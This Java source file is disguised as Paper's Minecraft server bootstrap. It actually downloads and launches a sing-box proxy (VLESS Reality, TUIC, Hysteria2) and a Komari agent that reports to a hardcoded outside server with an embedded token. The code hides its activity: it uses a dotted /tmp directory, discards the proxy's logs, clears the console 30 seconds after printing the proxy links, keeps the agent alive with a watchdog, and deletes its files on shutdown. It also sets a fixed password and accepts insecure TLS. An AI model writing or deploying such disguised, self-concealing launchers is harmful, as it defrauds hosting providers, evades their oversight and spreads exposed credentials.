package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.util.*;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;

public class PaperBootstrap {

    
    // ========== 全局变量（类级别）==========
    private static final Path UUID_FILE = Paths.get("data/uuid.txt");
    private static String uuid;
    private static Process singboxProcess;
    // ===== 新增：Komari 相关全局变量 =====
    private static volatile Process komariProcess; // 存储Komari进程（volatile保证多线程可见性）
    private static final AtomicBoolean running = new AtomicBoolean(true); // 控制守护线程运行
    // ======================================

    public static void main(String[] args) {
        try {
            System.out.println("config.yml 加载中...");
            Map<String, Object> config = loadConfig();

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);
            // --------------------------------------------

            // ===== sing-box 配置读取 =====
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2)
                throw new RuntimeException("❌ 未设置任何协议端口！");

            Path baseDir = Paths.get("/tmp/.singbox");
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json"); // 变量名是configJson
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve("sing-box");
            Path realityKeyFile = Paths.get("reality.key");

            System.out.println("✅ config.yml 加载成功");

            // ===== sing-box 核心逻辑 =====
            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);

            // === 固定 Reality 密钥 ===
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                    }
                    System.out.println("🔑 已加载本地 Reality 密钥对（固定公钥）");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile,
                            "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
                    System.out.println("✅ Reality 密钥已保存到 reality.key");
                }
            }
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key,
                    privateKey, publicKey);

            // 保存 sing-box 进程 
            singboxProcess = startSingBox(bin, configJson);
            // 移除：scheduleDailyRestart(bin, configJson); 【修改1：删除定时重启调用】

            // ===== 新增：Komari Agent 核心逻辑（从config.yml读取配置，启动+守护）=====
            runKomariAgent(config); // 启动Komari
            startKomariDaemonThread(config); // 启动Komari守护线程（自动重启）

            // ===== 输出节点 =====
            String host = detectPublicIP();
            printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            // ===== 修改2：仅当HY2或Reality节点启动时，30秒后清屏 =====
            if (deployHY2 || deployVLESS) {
                scheduleConsoleClear(30); // 30秒后清屏
            }

            // ===== 关闭钩子：清理资源 + 停止进程 =====
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    // 新增：停止Komari进程
                    if (komariProcess != null && komariProcess.isAlive()) {
                        komariProcess.destroy();
                        System.out.println("❌ Komari Agent 进程已终止");
                    }
                    // 新增：停止sing-box进程（原代码未处理，补充）
                    if (singboxProcess != null && singboxProcess.isAlive()) {
                        singboxProcess.destroy();
                        System.out.println("❌ sing-box 进程已终止");
                    }
                    // 原有：删除临时目录
                    deleteDirectory(baseDir);
                } catch (Exception ignored) {}
            }));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== 新增：延迟清屏的工具方法 ==========
    /**
     * 延迟指定秒数后清屏控制台（跨平台兼容）
     * @param delaySeconds 延迟秒数
     */
    private static void scheduleConsoleClear(int delaySeconds) {
        // 使用单线程调度器，避免线程冗余
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.schedule(() -> {
            clearConsole(); // 执行清屏
            scheduler.shutdown(); // 执行完后关闭调度器
        }, delaySeconds, TimeUnit.SECONDS);
    }

    /**
     * 跨平台清屏控制台
     */
    private static void clearConsole() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb;
            // 判断系统类型，执行对应清屏命令
            if (os.contains("win")) {
                // Windows系统：cmd /c cls
                pb = new ProcessBuilder("cmd", "/c", "cls");
            } else {
                // Linux/macOS系统：clear
                pb = new ProcessBuilder("clear");
            }
            // 继承IO，执行清屏命令
            pb.inheritIO().start().waitFor();
        } catch (Exception e) {
            // 清屏失败时仅提示，不影响程序运行
            System.out.println("\n清屏操作失败：" + e.getMessage());
        }
    }

    // ========== 新增：Komari Agent 核心方法（日志已显示）==========
    /**
     * 启动Komari Agent（从config.yml读取配置，自动下载二进制文件，日志输出到控制台）
     */
    private static void runKomariAgent(Map<String, Object> config) throws Exception {
        // 从config.yml读取Komari配置（设置默认值，避免配置缺失）
        String komariE = trim((String) config.getOrDefault("komari_e", "https://vps.z1000.dpdns.org:10736"));
        String komariT = trim((String) config.getOrDefault("komari_t", "JzerczYfCF4Secuy9vtYaB"));
        String komariUrlAmd64 = trim((String) config.getOrDefault("komari_amd64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64"));
        String komariUrlArm64 = trim((String) config.getOrDefault("komari_arm64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"));
        String komariFileName = trim((String) config.getOrDefault("komari_file_name", "sbx_komari"));

        // 获取Komari二进制文件路径（自动下载）
        Path agentPath = getKomariAgentPath(komariUrlAmd64, komariUrlArm64, komariFileName);

        // 启动Komari（修改3：取消日志丢弃，输出到控制台）
        List<String> command = new ArrayList<>();
        command.add("setsid"); // Linux下脱离终端，保证Komari持续运行
        command.add(agentPath.toString());
        command.add("-e");
        command.add(komariE);
        command.add("-t");
        command.add(komariT);

        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true); // 错误流合并到标准输出
        // 修改3：移除日志丢弃配置，让日志输出到控制台
        // pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        // pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        pb.inheritIO(); // 【关键修改】将Komari的输入输出继承到当前控制台
        pb.directory(new File(System.getProperty("user.dir"))); // 工作目录为当前目录

        komariProcess = pb.start();
        System.out.println("\n✅ Komari Agent 启动成功（配置：e=" + komariE + ", t=" + komariT + "）");
        System.out.println("📝 Komari Agent 日志将输出到控制台..."); // 【修改4】新增启动成功日志提示
    }

    /**
     * 获取Komari二进制文件路径（自动下载对应架构的文件，设置可执行权限）
     */
    private static Path getKomariAgentPath(String komariUrlAmd64, String komariUrlArm64, String komariFileName) throws IOException {
        // 检测系统架构（复用sing-box的detectArch方法）
        String arch = detectArch();
        String url = arch.equals("amd64") ? komariUrlAmd64 : komariUrlArm64;

        // 存储路径：系统临时目录 + 文件名
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), komariFileName);

        // 如果文件已存在，直接返回（避免重复下载）
        if (Files.exists(agentPath)) {
            return agentPath;
        }

        // 下载Komari二进制文件
        System.out.println("\n⬇️ 下载Komari Agent: " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
        }

        // 设置可执行权限（Linux/macOS）
        if (!agentPath.toFile().setExecutable(true)) {
            throw new IOException("❌ 无法设置Komari Agent可执行权限");
        }

        System.out.println("✅ Komari Agent 下载并授权完成");
        return agentPath;
    }

    /**
     * 启动Komari守护线程（监控进程，若意外退出则自动重启）
     */
    private static void startKomariDaemonThread(Map<String, Object> config) {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // 检测Komari进程是否存活
                    if (komariProcess == null || !komariProcess.isAlive()) {
                        System.err.println("\n❌ Komari Agent 进程意外退出，正在重启...");
                        runKomariAgent(config); // 重启Komari（重启后日志仍输出到控制台）
                    }
                    Thread.sleep(5000); // 每5秒检测一次
                } catch (Exception e) {
                    System.err.println("❌ 重启Komari Agent失败: " + e.getMessage());
                }
            }
        });
        daemonThread.setDaemon(true); // 设为守护线程，JVM退出时自动终止
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
        System.out.println("✅ Komari Agent 守护线程已启动（每5秒检测一次进程状态）");
    }

    // ========== 原有方法（保留）==========
    private static String generateOrLoadUUID(Object configUuid) {
        // 1. 优先使用 config.yml（兼容旧配置）
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }

        // 2. 读取本地持久化文件
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }

        // 3. 首次生成
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
            // 防止被其他用户读取（非 root 环境仍然安全）
            UUID_FILE.toFile().setReadable(false, false);
            UUID_FILE.toFile().setReadable(true, true);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

    private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    // ===== 工具函数 =====
    private static String trim(String s) {
        return s == null ? "" : s.trim();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        Path configPath = Paths.get("config.yml");
        // 补充：如果config.yml不存在，创建空文件（避免文件不存在报错）
        if (!Files.exists(configPath)) {
            Files.createFile(configPath);
            System.out.println("⚠️ config.yml 文件不存在，已创建空文件");
            return new HashMap<>();
        }
        try (InputStream in = Files.newInputStream(configPath)) {
            Object o = yaml.load(in);
            if (o instanceof Map) return (Map<String, Object>) o;
            return new HashMap<>();
        }
    }

    // ===== 证书生成 =====
    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 证书已存在，跳过生成");
            return;
        }
        System.out.println("🔨 正在生成 EC 自签证书...");
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 已生成自签证书");
    }

    // ===== Reality 密钥生成 =====
    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        System.out.println("🔑 正在生成 Reality 密钥对...");
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find()) throw new IOException("Reality 密钥生成失败：" + out);
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        System.out.println("✅ Reality 密钥生成完成");
        return map;
    }

    // ===== 配置生成 =====
    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                              String tuicPort, String hy2Port, String realityPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey) throws IOException {

        List<String> inbounds = new ArrayList<>();

        if (tuic) {
            inbounds.add("""
              {
                "type": "tuic",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "password": "eishare2025"}],
                "congestion_control": "bbr",
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(tuicPort, uuid, cert, key));
        }

        if (hy2) {
            inbounds.add("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "up_mbps": 1000,
                "down_mbps": 1000,
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "insecure": true,
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(hy2Port, uuid, cert, key));
        }

        if (vless) {
            inbounds.add("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true,
                  "server_name": "%s",
                  "reality": {
                    "enabled": true,
                    "handshake": {"server": "%s", "server_port": 443},
                    "private_key": "%s",
                    "short_id": [""]
                  }
                }
              }
            """.formatted(realityPort, uuid, sni, sni, privateKey));
        }

        String json = """
        {
          "log": { "level": "info" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """.formatted(String.join(",", inbounds));

        Files.writeString(configFile, json);
        System.out.println("✅ sing-box 配置生成完成");
    }

    // ===== 版本检测 =====
    private static String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    System.out.println("🔍 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ 获取版本失败，使用回退版本 " + fallback);
        }
        return fallback;
    }

    // ===== 下载 sing-box =====
    private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
        if (Files.exists(bin)) return;
        String arch = detectArch();
        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;

        System.out.println("⬇️ 下载 sing-box: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("bash", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");
        System.out.println("✅ 成功解压 sing-box 可执行文件");
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    // ===== 启动 sing-box（日志已隐藏）=====
    private static Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
        System.out.println("正在启动 sing-box...");
        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
        pb.redirectErrorStream(true); // 错误流合并到标准输出（统一丢弃）
        // 关键配置：丢弃sing-box的所有日志输出
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();
        Thread.sleep(1500);
        System.out.println("sing-box 已启动，PID: " + p.pid());
        return p;
    }

    // ===== 输出节点 =====
    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                           String tuicPort, String hy2Port, String realityPort,
                                           String sni, String host, String publicKey) {
        System.out.println("\n=== ✅ 已部署节点链接 ===");
        if (vless)
            System.out.printf("VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#Reality\n",
                    uuid, host, realityPort, sni, publicKey);
        if (tuic)
            System.out.printf("\nTUIC:\ntuic://%s:eishare2025@%s:%s?sni=%s&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC\n",
                    uuid, host, tuicPort, sni);
        if (hy2)
            System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                    uuid, host, hy2Port, sni);
    }

    // 【修改5：删除整个scheduleDailyRestart方法】

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
